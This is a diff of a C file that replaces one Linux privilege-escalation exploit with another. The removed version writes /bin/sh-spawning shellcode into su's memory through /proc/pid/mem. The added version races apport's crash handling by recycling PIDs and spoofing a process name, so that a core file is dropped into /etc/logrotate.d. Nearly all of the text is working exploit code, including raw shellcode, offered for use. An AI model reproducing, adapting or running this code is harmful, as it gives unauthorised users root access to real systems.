@@ -1,197 +1,162 @@
-#define _LARGEFILE64_SOURCE 
+#include <unistd.h>
 #include <stdio.h>
-#include <string.h>
+#include <unistd.h>
 #include <stdlib.h>
+#include <signal.h>
+
 #include <sys/types.h>
 #include <sys/stat.h>
-#include <sys/socket.h>
-#include <sys/un.h>
 #include <fcntl.h>
-#include <unistd.h>
-#include <limits.h>
 
-char *socket_path = "/tmp/.sockpuppet";
-int send_fd(int fd)
+#define PID_THRESHOLD (80)
+
+int read_max_pid_file()
 {
-	char buf[1];
-	struct iovec iov;
-	struct msghdr msg;
-	struct cmsghdr *cmsg;
-	struct sockaddr_un addr;
-	int n;
-	int sock;
-	char cms[CMSG_SPACE(sizeof(int))];
-	
-	if ((sock = socket(AF_UNIX, SOCK_STREAM, 0)) < 0)
-		return -1;
-	memset(&addr, 0, sizeof(addr));
-	addr.sun_family = AF_UNIX;
-	strncpy(addr.sun_path, socket_path, sizeof(addr.sun_path) - 1);
-	if (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) < 0)
-		return -1;
+	FILE *fd = 0;
+	char buf[256];
 
-	buf[0] = 0;
-	iov.iov_base = buf;
-	iov.iov_len = 1;
-
-	memset(&msg, 0, sizeof msg);
-	msg.msg_iov = &iov;
-	msg.msg_iovlen = 1;
-	msg.msg_control = (caddr_t)cms;
-	msg.msg_controllen = CMSG_LEN(sizeof(int));
-
-	cmsg = CMSG_FIRSTHDR(&msg);
-	cmsg->cmsg_len = CMSG_LEN(sizeof(int));
-	cmsg->cmsg_level = SOL_SOCKET;
-	cmsg->cmsg_type = SCM_RIGHTS;
-	memmove(CMSG_DATA(cmsg), &fd, sizeof(int));
-
-	if ((n = sendmsg(sock, &msg, 0)) != iov.iov_len)
-		return -1;
-	close(sock);
-	return 0;
+	fd = fopen("/proc/sys/kernel/pid_max", "r");
+	fread(buf, sizeof(buf), 1, fd);
+	fclose(fd);
+	return atoi(buf);
 }
 
-int recv_fd()
+void write_to_fifo_file(char * path)
 {
-	int listener;
-	int sock;
-	int n;
-	int fd;
-	char buf[1];
-	struct iovec iov;
-	struct msghdr msg;
-	struct cmsghdr *cmsg;
-	struct sockaddr_un addr;
-	char cms[CMSG_SPACE(sizeof(int))];
+	FILE *fd = 0;
+	char buf[] = "A";
 
-	if ((listener = socket(AF_UNIX, SOCK_STREAM, 0)) < 0)
-		return -1;
-	memset(&addr, 0, sizeof(addr));
-	addr.sun_family = AF_UNIX;
-	strncpy(addr.sun_path, socket_path, sizeof(addr.sun_path) - 1);
-	unlink(socket_path);
-	if (bind(listener, (struct sockaddr*)&addr, sizeof(addr)) < 0)
-		return -1;
-	if (listen(listener, 1) < 0)
-		return -1;
-	if ((sock = accept(listener, NULL, NULL)) < 0)
-		return -1;
-	
-	iov.iov_base = buf;
-	iov.iov_len = 1;
-
-	memset(&msg, 0, sizeof msg);
-	msg.msg_name = 0;
-	msg.msg_namelen = 0;
-	msg.msg_iov = &iov;
-	msg.msg_iovlen = 1;
-
-	msg.msg_control = (caddr_t)cms;
-	msg.msg_controllen = sizeof cms;
-
-	if ((n = recvmsg(sock, &msg, 0)) < 0)
-		return -1;
-	if (n == 0)
-		return -1;
-	cmsg = CMSG_FIRSTHDR(&msg);
-	memmove(&fd, CMSG_DATA(cmsg), sizeof(int));
-	close(sock);
-	close(listener);
-	return fd;
+	fd = fopen(path, "w");
+	fwrite(buf, sizeof(buf), 1, fd);
+	fclose(fd);
+	return;
 }
 
-int main(int argc, char **argv)
+
+int main(int argc, char *argv[])
 {
-	if (argc > 2 && argv[1][0] == '-' && argv[1][1] == 'c') {
-		char parent_mem[256];
-		sprintf(parent_mem, "/proc/%s/mem", argv[2]);
-		printf("[+] Opening parent mem %s in child.\n", parent_mem);
-		int fd = open(parent_mem, O_RDWR);
-		if (fd < 0) {
-			perror("[-] open");
-			return 1;
+	int iteration = 0;
+	pid_t crash_pid = -1, temp_pid = -1, spray_pid = -1;
+	int current_pid = 0, max_pid = 0;
+	int total_pid = 0;
+
+	char *crash_argv[] = {"crash", NULL};
+	char *sudo_argv[] = {"sudo", "-S", "sud", NULL};
+
+	char current_dir[1024] = {0};
+	char exec_buf[2048] = {0};
+	char crash_buf[2048] = {0};
+
+	struct stat sb = {0} ;
+
+	int null_fd = -1;
+
+	signal(SIGCHLD, SIG_IGN);
+	getcwd(current_dir, sizeof(current_dir));
+	snprintf(exec_buf, sizeof(exec_buf), "%s/%s", current_dir, "a\rUid: 0\rGid: 0");
+	snprintf(crash_buf, sizeof(crash_buf), "%s/%s", current_dir, "crash");
+
+	chdir("/etc/logrotate.d/");
+
+
+
+	// Creating the crash program
+	if (0 == stat(crash_buf, &sb) && sb.st_mode & S_IXUSR)
+	{
+		crash_pid = fork();
+		if (0 == crash_pid)
+		{
+			execve(crash_buf, crash_argv, NULL);
+			exit(0);
 		}
-		printf("[+] Sending fd %d to parent.\n", fd);
-		send_fd(fd);
-		return 0;
-	}
-	
-	printf("===============================\n");
-	printf("=         RATX Dev Team       =\n");
-	printf("=           by Ren0X          =\n");
-	printf("=          Oct 4, 2022        =\n");
-	printf("===============================\n\n");
-	
-	int parent_pid = getpid();
-	if (fork()) {
-		printf("[+] Waiting for transferred fd in parent.\n");
-		int fd = recv_fd();
-		printf("[+] Received fd at %d.\n", fd);
-		if (fd < 0) {
-			perror("[-] recv_fd");
+		else if(-1 == crash_pid)
+		{
+			printf("[-] Could not fork program\n");
 			return -1;
 		}
-		printf("[+] Assigning fd %d to stderr.\n", fd);
-		dup2(2, 6);
-		dup2(fd, 2);
-
-		unsigned long address;
-		if (argc > 2 && argv[1][0] == '-' && argv[1][1] == 'o')
-			address = strtoul(argv[2], NULL, 16);
-		else {
-			printf("[+] Reading su for exit@plt.\n");
-			// Poor man's auto-detection. Do this in memory instead of relying on objdump being installed.
-			FILE *command = popen("objdump -d /bin/su|grep 'exit@plt'|head -n 1|cut -d ' ' -f 1|sed 's/^[0]*\\([^0]*\\)/0x\\1/'", "r");
-			char result[32];
-			result[0] = 0;
-			fgets(result, 32, command);
-			pclose(command);
-			address = strtoul(result, NULL, 16);
-			if (address == ULONG_MAX || !address) {
-				printf("[-] Could not resolve /bin/su. Specify the exit@plt function address manually.\n");
-				printf("[-] Usage: %s -o ADDRESS\n[-] Example: %s -o 0x402178\n", argv[0], argv[0]);
-				return 1;
-			}
-			printf("[+] Resolved exit@plt to 0x%lx.\n", address);
-		}
-		printf("[+] Calculating su padding.\n");
-		FILE *command = popen("su this-user-does-not-exist 2>&1", "r");
-		char result[256];
-		result[0] = 0;
-		fgets(result, 256, command);
-		pclose(command);
-		unsigned long su_padding = (strstr(result, "this-user-does-not-exist") - result) / sizeof(char);
-		unsigned long offset = address - su_padding;
-		printf("[+] Seeking to offset 0x%lx.\n", offset);
-		lseek64(fd, offset, SEEK_SET);
-		
-#if defined(__i386__)
-		// See shellcode-32.s in this package for the source.
-		char shellcode[] =
-			"\x31\xdb\xb0\x17\xcd\x80\x31\xdb\xb0\x2e\xcd\x80\x31\xc9\xb3"
-			"\x06\xb1\x02\xb0\x3f\xcd\x80\x31\xc0\x50\x68\x6e\x2f\x73\x68"
-			"\x68\x2f\x2f\x62\x69\x89\xe3\x31\xd2\x66\xba\x2d\x69\x52\x89"
-			"\xe0\x31\xd2\x52\x50\x53\x89\xe1\x31\xd2\x31\xc0\xb0\x0b\xcd"
-			"\x80";
-#elif defined(__x86_64__)
-		// See shellcode-64.s in this package for the source.
-		char shellcode[] =
-			"\x48\x31\xff\xb0\x69\x0f\x05\x48\x31\xff\xb0\x6a\x0f\x05\x40"
-			"\xb7\x06\x40\xb6\x02\xb0\x21\x0f\x05\x48\xbb\x2f\x2f\x62\x69"
-			"\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31\xdb"
-			"\x66\xbb\x2d\x69\x53\x48\x89\xe1\x48\x31\xc0\x50\x51\x57\x48"
-			"\x89\xe6\x48\x31\xd2\xb0\x3b\x0f\x05";
-
-#else
-#error "That platform is not supported."
-#endif
-		printf("[+] Executing su with shellcode.\n");
-		execl("/bin/su", "su", shellcode, NULL);
-	} else {
-		char pid[32];
-		sprintf(pid, "%d", parent_pid);
-		printf("[+] Executing child from child fork.\n");
-		execl("/proc/self/exe", argv[0], "-c", pid, NULL);
 	}
+	else
+	{
+		printf("[-] Please check crash file executable.");
+		return -1;
+	}
+	
+
+	max_pid = read_max_pid_file();
+	printf("[*] crash pid: %d\n", crash_pid);
+	printf("[*] max pid: %d\n", max_pid);
+
+	printf("[*] Creating ~%d PIDs\n", max_pid);
+    printf("[*] Forking new processes\n");
+	sleep(3);
+
+	// Iterating through max_pid to almost reach the crash program pid
+	while (iteration < max_pid - 1)
+	{
+		// Print progress of forks
+		if( 0 == (iteration % (int)(max_pid / 5000)))
+		{
+			printf("\rIteration: %d/%d", iteration + 1, max_pid);
+			fflush(stdout);
+		}
+		temp_pid = -1;
+		temp_pid = fork();
+		if (0 == temp_pid)
+		{
+			exit(0);
+		}
+		else if (temp_pid > 0)
+		{
+			iteration++;
+			// We should stop before the crash pid to avoid other processes created meanwhile to interfere the exploit process
+			if ( temp_pid < crash_pid && crash_pid - temp_pid < PID_THRESHOLD)
+			{
+				printf("\rIteration: %d/%d\n", iteration + 1, max_pid);
+				fflush(stdout);
+				printf("[+] less then %d pid from the target: last fork=%d , target: %d\n", PID_THRESHOLD, temp_pid, crash_pid);
+				break;
+			}
+		}
+		else if (-1 == temp_pid)
+		{
+			printf("[-] Could not fork temp programs\n");
+		}
+	}
+
+	printf("[*] Crashing the crash program\n");
+	kill(crash_pid, SIGSEGV); // From Now on the seconds apport will launch and we have 30 seconds to exploit it
+	sleep(5);
+	printf("[*] Killing the crash program\n");
+	kill(crash_pid, SIGKILL);
+	sleep(3);
+
+	// Now crash pid is free and we need to occupy it
+	for(int i=0; i < PID_THRESHOLD ; i++)
+	{
+		spray_pid = fork();
+		if (0 == spray_pid)
+		{
+			if (crash_pid == getpid())
+			{
+				null_fd = open("/dev/null", O_WRONLY);
+				dup2(null_fd, 1);
+				dup2(null_fd, 2);
+				close(null_fd);
+
+				printf("[+] Creating suid process\n");
+				execve(exec_buf, sudo_argv, NULL);
+			}
+			exit(0);
+		}
+	}
+
+	sleep(3);
+	printf("[*] Writing to fifo file\n");
+	write_to_fifo_file(argv[1]);
+
+	// Now the first apport released and the second apport resumed
+	printf("[+] Wrote core file to cwd!\n");
+	sleep(10); // Waiting for the second apport to finish execution
+
+	return 0;
 }
